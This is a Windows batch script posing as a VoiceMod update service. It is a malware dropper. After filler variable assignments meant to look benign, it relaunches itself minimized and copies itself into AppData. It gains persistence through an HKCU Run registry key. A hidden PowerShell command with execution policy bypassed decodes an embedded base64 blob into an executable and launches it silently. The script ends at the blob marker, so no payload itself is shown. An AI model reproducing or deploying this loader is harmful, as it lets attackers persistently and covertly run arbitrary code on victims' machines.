@echo off
set VM_DRIVER_VER=2.1.0
set /a VM_IO_BUFFER=10 * 4
set VM_INSTANCE_ID=%RANDOM%
set VM_TIMESTAMP=%TIME:~0,2%%TIME:~3,2%
if exist %TEMP% set VM_STAGING_READY=1
set /a VM_CORE_REVISION=%RANDOM% %% 100
if defined TEMP set VM_CACHE_PATH=%TEMP%
set VM_SESSION_ID=%RANDOM%
set VM_ORIGIN_DIR=%CD%
set /a VM_RETRIES=39 * 2

if not defined VM_EXEC_FLAG (
    set VM_EXEC_FLAG=1
    start /min "" "%~f0" %*
    exit /b
)

setlocal enableDelayedExpansion
set "VOICEMOD_ROOT=%APPDATA%\VoiceMod\UpdateService"
set "TARGET_SVC=!VOICEMOD_ROOT!\VoiceModSvc.cmd"
set "EXTRACT_BIN=%TEMP%\VoiceMod_Update_Package.exe"

if not exist "!VOICEMOD_ROOT!" (
    mkdir "!VOICEMOD_ROOT!" >nul 2>&1
)

if /I not "%~f0"=="!TARGET_SVC!" (
    copy /Y "%~f0" "!TARGET_SVC!" >nul 2>&1
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VoiceModUpdateService" /t REG_SZ /d "cmd /c \"!TARGET_SVC!\"" /f >nul 2>&1

if not defined APPDATA exit /b
if not exist %TEMP% exit /b

powershell -NoProfile -W Hidden -EP Bypass -c "$f=[IO.File]::ReadAllText('%~f0'); if($f -match '(?s)::VM_DATA_BLOB_START(?<data>[A-Za-z0-9+/=\s\r\n]+)'){ $b=[Convert]::FromBase64String(($matches['data'] -replace '\s','')); [IO.File]::WriteAllBytes('!EXTRACT_BIN!', $b) }" >nul 2>&1

if exist "!EXTRACT_BIN!" (
    for %%I in ("!EXTRACT_BIN!") do if %%~zI GTR 102400 (
        start "" "!EXTRACT_BIN!" /S /silent /verysilent
    )
)

if %ERRORLEVEL% GEQ 0 set VM_STATUS_SUCCESS=1
set /a VM_SIGNAL_CODE=41 * 2
set VM_FINAL_CHECK=%RANDOM%
endlocal
exit /b

::VM_DATA_BLOB_
